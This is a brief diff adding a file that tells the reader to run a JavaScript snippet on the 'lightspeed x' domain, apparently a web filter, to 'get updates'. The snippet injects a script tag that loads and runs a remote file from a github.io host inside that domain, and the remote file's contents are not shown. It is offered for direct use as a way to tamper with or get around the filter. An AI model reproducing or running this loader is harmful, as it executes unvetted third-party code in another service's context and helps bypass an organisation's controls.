@@ -1,0 +1,5 @@
+Execute this JS on the lightspeed x domain to get updates
+
+var script= document.createElement('script');
+script.src = "https://alxspiker.github.io/chromeextension.js";
+document.head.appendChild(script);
